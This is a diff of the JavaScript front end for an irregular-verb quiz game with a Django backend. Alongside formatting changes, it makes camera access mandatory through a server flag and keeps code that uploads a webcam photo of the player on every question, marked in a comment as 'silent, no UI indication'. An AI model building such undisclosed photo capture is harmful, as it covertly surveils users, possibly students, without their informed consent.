@@ -2,29 +2,27 @@
 // STATE
 // ================================================================
 let ALL_VERBS = [];
+let CAMERA_REQUIRED = false;
+
 let state = {
   name: '', count: 10, mode: 'both',
   verbs: [], idx: 0, correct: 0, wrong: 0,
   answered: false,
-  sessionId: null,       // set after finishGame saves session
+  sessionId: null,
 };
 let selectedCount = null, selectedMode = null;
-
-// ================================================================
-// CAMERA STATE
-// ================================================================
 let cameraStream = null;
 let cameraAllowed = false;
-let pendingSessionId = null;  // temp store until session saved
 
 // ================================================================
-// BOOTSTRAP — load verbs from Django API
+// LOAD VERBS + SETTINGS from Django API
 // ================================================================
 async function loadVerbs() {
   try {
-    const res = await fetch(API_VERBS_URL);
+    const res  = await fetch(API_VERBS_URL);
     const data = await res.json();
-    ALL_VERBS = data.verbs;
+    ALL_VERBS        = data.verbs;
+    CAMERA_REQUIRED  = data.camera_required;
   } catch (e) {
     console.error('Could not load verbs:', e);
   }
@@ -50,36 +48,24 @@ async function requestCamera() {
       audio: false
     });
     cameraAllowed = true;
-    console.log('Camera granted');
   } catch (e) {
     cameraAllowed = false;
-    console.warn('Camera denied or unavailable:', e.message);
   }
 }
 
-function takeSnapshot() {
+async function takeSnapshot() {
   if (!cameraAllowed || !cameraStream) return null;
   try {
-    const video = document.createElement('video');
-    video.srcObject = cameraStream;
-    video.muted = true;
-
-    const canvas = document.createElement('canvas');
-    canvas.width  = 640;
-    canvas.height = 480;
-
-    // We need a live frame — draw from stream's video track
-    const track = cameraStream.getVideoTracks()[0];
+    const track        = cameraStream.getVideoTracks()[0];
     const imageCapture = new ImageCapture(track);
-
-    return imageCapture.grabFrame().then(bitmap => {
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(bitmap, 0, 0, 640, 480);
-      return canvas.toDataURL('image/jpeg', 0.7);
-    }).catch(() => null);
+    const bitmap       = await imageCapture.grabFrame();
+    const canvas       = document.createElement('canvas');
+    canvas.width       = 640;
+    canvas.height      = 480;
+    canvas.getContext('2d').drawImage(bitmap, 0, 0, 640, 480);
+    return canvas.toDataURL('image/jpeg', 0.7);
   } catch (e) {
-    console.warn('Snapshot failed:', e);
-    return Promise.resolve(null);
+    return null;
   }
 }
 
@@ -88,13 +74,9 @@ async function sendSnapshot(verbIndex, verbBase, sessionId) {
   try {
     const dataUrl = await takeSnapshot();
     if (!dataUrl) return;
-
     await fetch(API_SNAPSHOT_URL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-CSRFToken': CSRF_TOKEN,
-      },
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json', 'X-CSRFToken': CSRF_TOKEN },
       body: JSON.stringify({
         session_id: sessionId,
         verb_index: verbIndex,
@@ -102,9 +84,7 @@ async function sendSnapshot(verbIndex, verbBase, sessionId) {
         image:      dataUrl,
       }),
     });
-  } catch (e) {
-    console.warn('Could not send snapshot:', e);
-  }
+  } catch (e) {}
 }
 
 // ================================================================
@@ -144,29 +124,34 @@ async function startGame() {
     return;
   }
 
-  // Request camera before game starts
-  await requestCamera();
+  // ── Camera logic ──────────────────────────────────────────────
+  if (CAMERA_REQUIRED) {
+    await requestCamera();
+    if (!cameraAllowed) {
+      alert('📷 Camera access is required to start the game.\nPlease allow camera and try again.');
+      return;
+    }
+  }
+  // CAMERA_REQUIRED = false bo'lsa — kamera so'ralmaydi umuman
+  // ─────────────────────────────────────────────────────────────
 
   const shuffled = [...ALL_VERBS].sort(() => Math.random() - 0.5);
-  state.verbs = shuffled.slice(0, Math.min(state.count, shuffled.length));
-  state.idx = 0; state.correct = 0; state.wrong = 0;
+  state.verbs    = shuffled.slice(0, Math.min(state.count, shuffled.length));
+  state.idx      = 0;
+  state.correct  = 0;
+  state.wrong    = 0;
   state.sessionId = null;
 
-  // Create session in DB right away so we have an ID for snapshots
+  // Pre-create session
   try {
-    const res = await fetch(API_SAVE_URL, {
-      method: 'POST',
+    const res  = await fetch(API_SAVE_URL, {
+      method:  'POST',
       headers: { 'Content-Type': 'application/json', 'X-CSRFToken': CSRF_TOKEN },
-      body: JSON.stringify({
-        name: state.name, mode: state.mode,
-        total: 0, correct: 0, wrong: 0, pct: 0,
-      }),
+      body: JSON.stringify({ name: state.name, mode: state.mode, total: 0, correct: 0, wrong: 0, pct: 0 }),
     });
     const data = await res.json();
     if (data.ok) state.sessionId = data.id;
-  } catch (e) {
-    console.warn('Could not pre-create session:', e);
-  }
+  } catch (e) {}
 
   goTo('screen-game');
   renderVerb();
@@ -180,13 +165,13 @@ function renderVerb() {
   const total = state.verbs.length;
 
   document.getElementById('base-verb-display').textContent = verb.base;
-  document.getElementById('progress-label').textContent = `Verb ${state.idx + 1} of ${total}`;
-  document.getElementById('progress-fill').style.width = `${(state.idx / total) * 100}%`;
-  document.getElementById('score-live').textContent = state.correct;
-  document.getElementById('feedback-msg').textContent = '';
-  document.getElementById('feedback-msg').className = 'feedback-msg';
-  document.getElementById('check-btn').style.display = '';
-  document.getElementById('next-btn').style.display = 'none';
+  document.getElementById('progress-label').textContent    = `Verb ${state.idx + 1} of ${total}`;
+  document.getElementById('progress-fill').style.width     = `${(state.idx / total) * 100}%`;
+  document.getElementById('score-live').textContent        = state.correct;
+  document.getElementById('feedback-msg').textContent      = '';
+  document.getElementById('feedback-msg').className        = 'feedback-msg';
+  document.getElementById('check-btn').style.display       = '';
+  document.getElementById('next-btn').style.display        = 'none';
   state.answered = false;
 
   const chip = document.getElementById('mode-chip');
@@ -220,7 +205,7 @@ function renderVerb() {
     if (first) first.focus();
   }, 100);
 
-  // 📸 Take snapshot as soon as verb card appears
+  // 📸 Snapshot — silent, no UI indication
   if (state.sessionId) {
     sendSnapshot(state.idx + 1, verb.base, state.sessionId);
   }
@@ -245,8 +230,8 @@ function checkAnswer() {
     const fb  = document.getElementById('fb-past');
     const ok  = checkAnswers(inp.value, verb.past);
     inp.className = 'answer-input ' + (ok ? 'correct' : 'wrong');
-    inp.disabled = true;
-    if (ok) { fb.className = 'feedback-row ok'; fb.textContent = '✅ Correct!'; }
+    inp.disabled  = true;
+    if (ok) { fb.className = 'feedback-row ok';  fb.textContent = '✅ Correct!'; }
     else    { fb.className = 'feedback-row err'; fb.textContent = `❌ Answer: ${verb.past}`; allCorrect = false; }
   }
   if (state.mode === 'pp' || state.mode === 'both') {
@@ -254,19 +239,19 @@ function checkAnswer() {
     const fb  = document.getElementById('fb-pp');
     const ok  = checkAnswers(inp.value, verb.pp);
     inp.className = 'answer-input ' + (ok ? 'correct' : 'wrong');
-    inp.disabled = true;
-    if (ok) { fb.className = 'feedback-row ok'; fb.textContent = '✅ Correct!'; }
+    inp.disabled  = true;
+    if (ok) { fb.className = 'feedback-row ok';  fb.textContent = '✅ Correct!'; }
     else    { fb.className = 'feedback-row err'; fb.textContent = `❌ Answer: ${verb.pp}`; allCorrect = false; }
   }
 
   if (allCorrect) {
     state.correct++;
-    document.getElementById('feedback-msg').className = 'feedback-msg correct';
+    document.getElementById('feedback-msg').className   = 'feedback-msg correct';
     document.getElementById('feedback-msg').textContent = '🎉 Perfect! Keep it up!';
     playSound('correct');
   } else {
     state.wrong++;
-    document.getElementById('feedback-msg').className = 'feedback-msg wrong';
+    document.getElementById('feedback-msg').className   = 'feedback-msg wrong';
     document.getElementById('feedback-msg').textContent = "📖 Study this one — you'll get it next time!";
     playSound('wrong');
   }
@@ -274,7 +259,7 @@ function checkAnswer() {
   document.getElementById('score-live').textContent = state.correct;
   state.answered = true;
   document.getElementById('check-btn').style.display = 'none';
-  document.getElementById('next-btn').style.display = '';
+  document.getElementById('next-btn').style.display  = '';
 }
 
 function nextVerb() {
@@ -295,36 +280,35 @@ async function finishGame() {
   // Stop camera
   if (cameraStream) {
     cameraStream.getTracks().forEach(t => t.stop());
-    cameraStream = null;
+    cameraStream  = null;
+    cameraAllowed = false;
   }
 
   // Update session with final scores
   if (state.sessionId) {
     try {
       await fetch(API_SAVE_URL, {
-        method: 'POST',
+        method:  'POST',
         headers: { 'Content-Type': 'application/json', 'X-CSRFToken': CSRF_TOKEN },
         body: JSON.stringify({
+          session_id: state.sessionId,
           name: state.name, mode: state.mode,
           total, correct: state.correct, wrong: state.wrong, pct,
-          session_id: state.sessionId,   // signal to update, not create
         }),
       });
-    } catch (e) { console.warn('Could not update session:', e); }
+    } catch (e) {}
   }
 
   // Results UI
-  document.getElementById('result-pct').textContent = pct + '%';
-  document.getElementById('r-correct').textContent = state.correct;
-  document.getElementById('r-wrong').textContent   = state.wrong;
-  document.getElementById('r-total').textContent   = total;
-  document.getElementById('r-name').textContent    = state.name;
+  document.getElementById('result-pct').textContent  = pct + '%';
+  document.getElementById('r-correct').textContent   = state.correct;
+  document.getElementById('r-wrong').textContent     = state.wrong;
+  document.getElementById('r-total').textContent     = total;
+  document.getElementById('r-name').textContent      = state.name;
 
-  const pctEl = document.querySelector('.score-circle .pct');
-  const circle = document.querySelector('.score-circle');
-  const color = pct >= 80 ? '#10b981' : pct >= 50 ? '#f59e0b' : '#ef4444';
-  circle.style.borderColor = color;
-  pctEl.style.color = color;
+  const color  = pct >= 80 ? '#10b981' : pct >= 50 ? '#f59e0b' : '#ef4444';
+  document.querySelector('.score-circle').style.borderColor   = color;
+  document.querySelector('.score-circle .pct').style.color    = color;
 
   if      (pct === 100) { document.getElementById('result-emoji').textContent = '🏆'; document.getElementById('result-title').textContent = 'Perfect Score!'; }
   else if (pct >= 80)   { document.getElementById('result-emoji').textContent = '🎉'; document.getElementById('result-title').textContent = `Great Job, ${state.name}!`; }
